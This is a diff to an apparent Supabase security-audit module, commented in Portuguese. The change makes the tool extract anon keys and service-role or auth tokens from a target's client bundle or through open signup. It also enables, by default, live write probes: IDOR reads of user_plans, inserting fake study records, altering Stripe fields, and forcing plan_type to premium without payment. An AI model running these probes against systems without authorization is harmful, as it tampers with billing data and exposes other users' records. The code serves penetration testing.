@@ -11,14 +11,25 @@
  *  5. Stripe field bypass    — PATCH direto em campos stripe_* sem validação
  *  6. Payment privilege esc. — PATCH plan_type=premium sem pagamento real
  *
- * Probes de leitura: usam anonKey (extraído pelo lovable-fingerprint).
- * Probes de escrita: requerem opts.authToken (GHOSTRECON_SUPABASE_AUTH_TOKEN).
+ * Probes de leitura: usam anonKey extraída automaticamente do bundle do alvo.
+ * Probes de escrita: obtêm authToken do bundle, signup anônimo/aberto ou GHOSTRECON_SUPABASE_AUTH_TOKEN.
  *
  * Todos os probes destrutivos tentam cleanup após a coleta de evidências.
  */
 
 import https from 'node:https';
 import http from 'node:http';
+import {
+  runSupabaseRlsAudit,
+  detectServiceRoleExposure,
+  SUPABASE_VULN_TAXONOMY,
+  extractSupabaseCredentials,
+  resolveSupabaseAuthToken,
+  discoverSupabaseFromTarget,
+  fetchClientBundleText,
+} from './supabase-rls-audit.mjs';
+
+export { detectServiceRoleExposure, SUPABASE_VULN_TAXONOMY, extractSupabaseCredentials, discoverSupabaseFromTarget };
 
 const TIMEOUT_MS = 12_000;
 const UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';
@@ -206,7 +217,7 @@ async function probe2FA(supabaseUrl, anonKey, log) {
 
 // ── PROBE 3: IDOR em user_plans ───────────────────────────────────────────────
 
-async function probeIdorUserPlans(supabaseUrl, anonKey, authToken, log) {
+async function probeIdorUserPlans(supabaseUrl, anonKey, authToken, log, apiKey = anonKey) {
   const findings = [];
 
   // 3a. Leitura com anon key (sem autenticação de usuário)
@@ -246,7 +257,7 @@ async function probeIdorUserPlans(supabaseUrl, anonKey, authToken, log) {
     const userId = extractUserId(authToken);
     const urlAuth = `${supabaseUrl}/rest/v1/user_plans?select=*&limit=10`;
     log?.('[supabase-audit] IDOR: lendo user_plans com auth token de usuário', 'info');
-    const resAuth = await rawRequest(urlAuth, { headers: supabaseHeaders(anonKey, authToken) });
+    const resAuth = await rawRequest(urlAuth, { headers: supabaseHeaders(apiKey, authToken) });
 
     if (resAuth.status === 200) {
       let rows = [];
@@ -280,9 +291,9 @@ async function probeIdorUserPlans(supabaseUrl, anonKey, authToken, log) {
 
 // ── PROBE 4: Business Logic — study_records ───────────────────────────────────
 
-async function probeBusinessLogic(supabaseUrl, anonKey, authToken, log) {
+async function probeBusinessLogic(supabaseUrl, anonKey, authToken, log, apiKey = anonKey) {
   if (!authToken) {
-    log?.('[supabase-audit] Business logic: sem authToken — probe ignorado (definir GHOSTRECON_SUPABASE_AUTH_TOKEN)', 'info');
+    log?.('[supabase-audit] Business logic: sem token autenticado — probe ignorado', 'info');
     return null;
   }
 
@@ -305,7 +316,7 @@ async function probeBusinessLogic(supabaseUrl, anonKey, authToken, log) {
   log?.('[supabase-audit] Business logic: inserindo registro de estudo com valores absurdos', 'info');
   const res = await rawRequest(endpoint, {
     method: 'POST',
-    headers: { ...supabaseHeaders(anonKey, authToken), Prefer: 'return=representation' },
+    headers: { ...supabaseHeaders(apiKey, authToken), Prefer: 'return=representation' },
     body: JSON.stringify(payload),
   });
 
@@ -319,14 +330,14 @@ async function probeBusinessLogic(supabaseUrl, anonKey, authToken, log) {
     if (insertedId) {
       await rawRequest(`${endpoint}?id=eq.${insertedId}`, {
         method: 'DELETE',
-        headers: supabaseHeaders(anonKey, authToken),
+        headers: supabaseHeaders(apiKey, authToken),
       });
       log?.(`[supabase-audit] Business logic: cleanup — registro ${insertedId} removido`, 'info');
     } else {
       // Tenta limpar pelo marcador
       await rawRequest(`${endpoint}?subject=eq.${AUDIT_MARKER}`, {
         method: 'DELETE',
-        headers: supabaseHeaders(anonKey, authToken),
+        headers: supabaseHeaders(apiKey, authToken),
       });
     }
 
@@ -355,7 +366,7 @@ async function probeBusinessLogic(supabaseUrl, anonKey, authToken, log) {
 
 // ── PROBE 5: Manipulação de campos Stripe ─────────────────────────────────────
 
-async function probeStripeFieldManipulation(supabaseUrl, anonKey, authToken, log) {
+async function probeStripeFieldManipulation(supabaseUrl, anonKey, authToken, log, apiKey = anonKey) {
   if (!authToken) {
     log?.('[supabase-audit] Stripe fields: sem authToken — probe ignorado', 'info');
     return null;
@@ -371,14 +382,14 @@ async function probeStripeFieldManipulation(supabaseUrl, anonKey, authToken, log
 
   // Leitura prévia para backup
   const backup = await rawRequest(endpoint + '&select=stripe_subscription_id,stripe_customer_id', {
-    headers: supabaseHeaders(anonKey, authToken),
+    headers: supabaseHeaders(apiKey, authToken),
   });
   let original = null;
   try { original = JSON.parse(backup.body)?.[0] || null; } catch {}
 
   const res = await rawRequest(endpoint, {
     method: 'PATCH',
-    headers: supabaseHeaders(anonKey, authToken),
+    headers: supabaseHeaders(apiKey, authToken),
     body: JSON.stringify(fakeStripe),
   });
 
@@ -388,7 +399,7 @@ async function probeStripeFieldManipulation(supabaseUrl, anonKey, authToken, log
   if (accepted && original) {
     await rawRequest(endpoint, {
       method: 'PATCH',
-      headers: supabaseHeaders(anonKey, authToken),
+      headers: supabaseHeaders(apiKey, authToken),
       body: JSON.stringify({
         stripe_subscription_id: original.stripe_subscription_id ?? null,
         stripe_customer_id: original.stripe_customer_id ?? null,
@@ -423,7 +434,7 @@ async function probeStripeFieldManipulation(supabaseUrl, anonKey, authToken, log
 
 // ── PROBE 6: Payment Privilege Escalation ─────────────────────────────────────
 
-async function probePaymentBypass(supabaseUrl, anonKey, authToken, log) {
+async function probePaymentBypass(supabaseUrl, anonKey, authToken, log, apiKey = anonKey) {
   if (!authToken) {
     log?.('[supabase-audit] Payment bypass: sem authToken — probe ignorado', 'info');
     return null;
@@ -437,7 +448,7 @@ async function probePaymentBypass(supabaseUrl, anonKey, authToken, log) {
   // Lê estado atual para backup
   log?.('[supabase-audit] Payment bypass: lendo plan atual para backup', 'info');
   const backupRes = await rawRequest(endpoint + '&select=plan_type,premium_expires_at', {
-    headers: supabaseHeaders(anonKey, authToken),
+    headers: supabaseHeaders(apiKey, authToken),
   });
   let original = null;
   try { original = JSON.parse(backupRes.body)?.[0] || null; } catch {}
@@ -447,7 +458,7 @@ async function probePaymentBypass(supabaseUrl, anonKey, authToken, log) {
 
   const res = await rawRequest(endpoint, {
     method: 'PATCH',
-    headers: supabaseHeaders(anonKey, authToken),
+    headers: supabaseHeaders(apiKey, authToken),
     body: JSON.stringify(attackPayload),
   });
 
@@ -457,7 +468,7 @@ async function probePaymentBypass(supabaseUrl, anonKey, authToken, log) {
   if (bypassed && original) {
     await rawRequest(endpoint, {
       method: 'PATCH',
-      headers: supabaseHeaders(anonKey, authToken),
+      headers: supabaseHeaders(apiKey, authToken),
       body: JSON.stringify({
         plan_type: original.plan_type ?? 'free',
         premium_expires_at: original.premium_expires_at ?? null,
@@ -510,23 +521,64 @@ WITH CHECK (
  * @returns {Promise<{findings: object[], summary: object}>}
  */
 export async function runSupabaseAudit(context, opts = {}) {
-  const { supabaseUrl, anonKey } = context || {};
-  const { authToken = null, targetUrl = '', log = null } = opts;
+  let { supabaseUrl, anonKey, bundleText = '' } = context || {};
+  const { authToken: envAuthOverride = null, targetUrl = '', log = null, writeProbes = true } = opts;
+
+  if ((!supabaseUrl || !anonKey) && targetUrl) {
+    if (!bundleText) bundleText = await fetchClientBundleText(targetUrl);
+    const extracted = extractSupabaseCredentials(bundleText);
+    supabaseUrl = supabaseUrl || extracted.supabaseUrl;
+    anonKey = anonKey || extracted.anonKey;
+  }
 
   if (!supabaseUrl || !anonKey) {
-    return { findings: [], summary: { skipped: 'sem supabaseUrl ou anonKey' } };
+    return { findings: [], summary: { skipped: 'sem supabaseUrl ou anonKey no alvo' } };
   }
 
   log?.(`[supabase-audit] Iniciando auditoria em ${supabaseUrl}`, 'info');
+  log?.('[supabase-audit] Anon key extraída do alvo — probes de leitura habilitados', 'info');
+
+  const envToken = envAuthOverride
+    || String(process.env.GHOSTRECON_SUPABASE_AUTH_TOKEN || '').trim()
+    || null;
+
+  const resolved = await resolveSupabaseAuthToken(supabaseUrl, anonKey, {
+    bundleText,
+    log,
+    envToken,
+  });
+  const authToken = resolved.authToken;
+  const apiKey = resolved.apiKey || anonKey;
+
   if (authToken) {
     const uid = extractUserId(authToken);
-    log?.(`[supabase-audit] Auth token presente — probes de escrita habilitados (user_id=${uid || '?'})`, 'info');
+    log?.(
+      `[supabase-audit] Token autenticado obtido (fonte=${resolved.source}, user_id=${uid || 'service_role'}) — probes de escrita habilitados`,
+      resolved.source === 'bundle_service_role' ? 'warn' : 'info',
+    );
   } else {
-    log?.('[supabase-audit] Sem auth token — probes de escrita desabilitados (definir GHOSTRECON_SUPABASE_AUTH_TOKEN)', 'info');
+    log?.('[supabase-audit] Sem token autenticado — probes de escrita autenticados ignorados', 'info');
   }
 
   const findings = [];
-  const results = {};
+  const results = { authTokenSource: resolved.source || null };
+
+  // 0. RLS / Storage / Auth / GraphQL / RPC / Service Role (generalista)
+  try {
+    const rlsAudit = await runSupabaseRlsAudit(
+      { supabaseUrl, anonKey, bundleText },
+      {
+        log,
+        targetUrl,
+        writeProbes: writeProbes && String(process.env.GHOSTRECON_SUPABASE_WRITE_PROBES || '1').trim() !== '0',
+      },
+    );
+    findings.push(...(rlsAudit.findings || []));
+    results.rlsAudit = rlsAudit.summary?.results || {};
+  } catch (e) {
+    log?.(`[supabase-audit] RLS audit erro: ${e.message}`, 'warn');
+    results.rlsAudit = 'erro';
+  }
 
   // 1. Rate Limiting
   try {
@@ -550,7 +602,7 @@ export async function runSupabaseAudit(context, opts = {}) {
 
   // 3. IDOR user_plans
   try {
-    const fs = await probeIdorUserPlans(supabaseUrl, anonKey, authToken, log);
+    const fs = await probeIdorUserPlans(supabaseUrl, anonKey, authToken, log, apiKey);
     findings.push(...fs);
     results.idorUserPlans = fs.length ? `${fs.length} achado(s)` : 'ok';
   } catch (e) {
@@ -560,7 +612,7 @@ export async function runSupabaseAudit(context, opts = {}) {
 
   // 4. Business Logic — study_records
   try {
-    const f = await probeBusinessLogic(supabaseUrl, anonKey, authToken, log);
+    const f = await probeBusinessLogic(supabaseUrl, anonKey, authToken, log, apiKey);
     if (f) findings.push(f);
     results.businessLogic = f ? 'vulneravel' : (authToken ? 'ok' : 'ignorado_sem_token');
   } catch (e) {
@@ -570,7 +622,7 @@ export async function runSupabaseAudit(context, opts = {}) {
 
   // 5. Stripe field manipulation
   try {
-    const f = await probeStripeFieldManipulation(supabaseUrl, anonKey, authToken, log);
+    const f = await probeStripeFieldManipulation(supabaseUrl, anonKey, authToken, log, apiKey);
     if (f) findings.push(f);
     results.stripeFields = f ? 'vulneravel' : (authToken ? 'ok' : 'ignorado_sem_token');
   } catch (e) {
@@ -580,7 +632,7 @@ export async function runSupabaseAudit(context, opts = {}) {
 
   // 6. Payment bypass — executado por último pois é o mais impactante
   try {
-    const f = await probePaymentBypass(supabaseUrl, anonKey, authToken, log);
+    const f = await probePaymentBypass(supabaseUrl, anonKey, authToken, log, apiKey);
     if (f) findings.push(f);
     results.paymentBypass = f ? 'CRITICO' : (authToken ? 'ok' : 'ignorado_sem_token');
   } catch (e) {
@@ -599,6 +651,7 @@ export async function runSupabaseAudit(context, opts = {}) {
       supabaseUrl,
       targetUrl,
       authTokenPresent: Boolean(authToken),
+      authTokenSource: resolved.source || null,
       totalFindings: findings.length,
       critical,
       high,
